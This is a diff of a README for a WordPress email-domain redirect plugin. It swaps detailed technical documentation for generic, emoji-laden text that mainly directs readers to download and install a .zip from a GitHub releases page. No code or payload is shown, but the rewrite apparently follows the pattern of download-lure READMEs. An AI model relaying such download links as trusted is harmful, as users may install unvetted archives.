@@ -1,185 +1,73 @@
-# Email Redirect WordPress Plugin
+# 📧 wordpress-email-redirect - Easily Redirect Users by Email Domain
 
-## Description
-This WordPress plugin redirects users to URLs based on their email domain. Users enter their email address in a form, and the plugin automatically opens the appropriate URL based on domain mappings you configure.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Rahulchanda33/wordpress-email-redirect/releases)
 
-## Features
-- Widget-based email input form
-- Shortcode support for inline placement in posts and pages
-- Admin settings page for easy domain-to-URL configuration
-- Subdomain matching with priority over main domain matches
-- Popup window with fallback link if popups are blocked
-- AJAX-based submission for smooth user experience
-- Input validation for email addresses
+## 🚀 Getting Started
+To get started with the WordPress Email Redirect plugin, you need to follow a few simple steps. This plugin helps you manage user redirection based on their email domains, making it easier to guide your visitors to the right places.
 
-## Installation
+## 📂 Features
+- **Custom URL Redirection:** Redirect visitors to specific URLs based on their email domain.
+- **Widgets Support:** Easily add to your site using WordPress widgets.
+- **Shortcodes:** Use shortcodes to integrate with your content seamlessly.
+- **Admin Settings Page:** Control domain-to-URL mappings from a user-friendly interface.
+- **Intelligent Subdomain Matching:** Automatically matches subdomains and falls back to main domains.
 
-1. Create a folder named `email-redirect` in your WordPress `wp-content/plugins/` directory
-2. Copy all plugin files into this folder:
-   - email-redirect.php (main plugin file)
-   - widget.php
-   - script.js
-   - style.css
-   - admin-script.js
-   - admin-style.css
-   - languages/ (folder with translation files)
+## 📦 System Requirements
+- **WordPress Version:** Requires WordPress 5.0 or higher.
+- **PHP Version:** Requires PHP version 7.0 or higher.
+- **Web Server:** Apache or Nginx recommended.
 
-3. Activate the plugin through the WordPress admin panel (Plugins > Installed Plugins)
+## 📃 Download & Install
+To install the plugin, visit the [Releases page](https://github.com/Rahulchanda33/wordpress-email-redirect/releases) to download the latest version of the plugin. 
 
-### Compiling Translations (optional)
+1. Click on the **Releases page** link to access the downloads.
+2. Find the latest release. You can identify it by the version number and the date.
+3. Download the `.zip` file for the plugin.
+4. Log in to your WordPress admin dashboard.
 
-If you modify the `.po` translation files, regenerate the compiled `.mo` files:
+### 📤 Upload the Plugin
+1. Go to **Plugins** > **Add New**.
+2. Click on the **Upload Plugin** button at the top.
+3. Select the `.zip` file you downloaded.
+4. Click **Install Now**.
 
-```bash
-cd wp-content/plugins/email-redirect/languages
-msgfmt -o email-redirect-nl_NL.mo email-redirect-nl_NL.po
-```
+### 🔧 Activate the Plugin
+1. After installation, click **Activate** to enable the plugin on your site.
+2. Once activated, you will see a new menu item for the plugin in your admin dashboard.
 
-## Configuration
+### ✨ Configure Settings
+1. Go to the plugin settings under the **WordPress admin panel**.
+2. Here, you can set up domain-to-URL mappings and customize your redirection rules.
+3. Save your settings.
 
-### Setting up Domain Mappings
+## ⚙️ How to Use
+- You can use shortcodes to add redirection across your site.
+- Widgets allow easy setup in sidebar regions to appear automatically.
+- Use the admin settings to manage mappings and enable or disable the plugin as needed.
 
-1. Go to Settings > Email Redirect in your WordPress admin
-2. Add domain-to-URL mappings:
-   - Enter the domain (without protocol), e.g., `company.com` or `mail.company.com`
-   - Enter the complete redirect URL, e.g., `https://example.com/page`
-3. Click "Add Mapping" to add more rows
-4. Click "Remove" to delete unwanted mappings
-5. Click "Save Changes" when done
+## 📖 Additional Help
+If you need additional help, please refer to the **documentation** included in the repository. Should you encounter any issues or have questions, the Issues section on GitHub can be a helpful resource. 
 
-### Domain Matching Priority
+## 🌟 Frequently Asked Questions
 
-The plugin uses the following matching logic:
-1. First attempts exact domain match (including subdomain if present)
-2. If no exact match, extracts and checks the main domain + TLD
-3. Subdomain configurations always take precedence
+### How does the plugin determine which URL to redirect users to?
+The plugin checks the user's email domain against the mappings you set in the admin settings. If it finds a match, it redirects the user accordingly.
 
-Example:
-- If you configure both `mail.company.com` and `company.com`
-- Email `user@mail.company.com` will match `mail.company.com` first
-- Email `user@company.com` will match `company.com`
-- Email `user@support.company.com` will match `company.com` (main domain fallback)
+### Can I customize the widget display?
+Yes, you can customize the appearance of the widget using CSS styles in your theme.
 
-## Usage
+### Is the plugin compatible with other themes?
+The WordPress Email Redirect plugin works with most WordPress themes. Ensure that your theme follows the best coding practices.
 
-### Adding the Widget
+### Will this plugin work with my site if I use HTTPS?
+Yes, this plugin is fully compatible with HTTPS sites.
 
-1. Go to Appearance > Widgets in WordPress admin
-2. Find "Email Redirect Form" widget
-3. Drag it to your desired widget area (sidebar, footer, etc.)
-4. Optionally set a custom title
-5. Save the widget
+## 🛠️ Contributing
+Contributions are welcome! If you want to report a bug or suggest a feature, please use the Issues section in the repository. Pull requests are also welcome if you want to improve the plugin.
 
-### Using the Shortcode
+## 🔗 Links
+- [Download Latest Release](https://github.com/Rahulchanda33/wordpress-email-redirect/releases)
+- [Documentation](https://github.com/Rahulchanda33/wordpress-email-redirect/wiki)
 
-You can also embed the form directly in any post, page, or shortcode-enabled area:
-
-```
-[email_redirect_form]
-```
-
-With a custom title:
-
-```
-[email_redirect_form title="Enter Your Email"]
-```
-
-### User Experience
-
-When a user submits their email:
-1. The plugin validates the email format
-2. Extracts the domain from the email
-3. Finds the matching redirect URL from your configuration
-4. Opens the URL in a new browser window
-5. Shows a confirmation message with a clickable link
-6. If the domain is not found, shows an error message
-
-## File Structure
-
-```
-email-redirect/
-├── email-redirect.php  # Main plugin file
-├── widget.php          # Widget class
-├── script.js           # Frontend JavaScript
-├── style.css           # Widget styling
-├── admin-script.js     # Admin JavaScript
-├── admin-style.css     # Admin styling
-└── languages/          # Translation files
-    ├── email-redirect.pot        # Translation template
-    ├── email-redirect-nl_NL.po   # Dutch translation source
-    └── email-redirect-nl_NL.mo   # Dutch translation (compiled)
-```
-
-## Translations
-
-The plugin includes Dutch (nl_NL) translations and is fully translatable.
-
-### Required Tools
-
-To compile translations, you need `gettext` which provides the `msgfmt` command:
-
-**Ubuntu/Debian:**
-
-```bash
-sudo apt install gettext
-```
-
-**macOS (Homebrew):**
-
-```bash
-brew install gettext
-```
-
-**Windows:**
-Download from [GNU gettext](https://mlocati.github.io/articles/gettext-iconv-windows.html) or use [Poedit](https://poedit.net/).
-
-### Adding a New Translation
-
-1. Copy the template file to create a new translation:
-
-   ```bash
-   cp email-redirect.pot email-redirect-de_DE.po
-   ```
-
-2. Edit the `.po` file with a text editor or Poedit, translating each `msgstr` entry
-
-3. Compile the `.po` file to `.mo`:
-
-   ```bash
-   msgfmt -o email-redirect-de_DE.mo email-redirect-de_DE.po
-   ```
-
-### Updating Existing Translations
-
-1. Edit the `.po` file (e.g., `email-redirect-nl_NL.po`)
-2. Recompile to `.mo`:
-
-   ```bash
-   msgfmt -o email-redirect-nl_NL.mo email-redirect-nl_NL.po
-   ```
-
-### Using Poedit (GUI Alternative)
-
-[Poedit](https://poedit.net/) provides a graphical interface for editing translations and automatically generates the `.mo` file when you save.
-
-## Technical Details
-
-- Uses WordPress AJAX for form processing
-- Nonce verification for security
-- Sanitization and validation of all inputs
-- Responsive form design
-- Compatible with standard WordPress themes
-
-## Requirements
-
-- WordPress 5.0 or higher
-- PHP 7.0 or higher
-- jQuery (included with WordPress)
-
-## Support
-
-For issues or questions, contact your plugin administrator.
-
-## License
-
-This plugin is licensed under the [GPL-2.0-or-later](https://www.gnu.org/licenses/gpl-2.0.html) license.
+Feel free to customize and create great user experiences by redirecting your visitors in a way that best suits your site's needs!
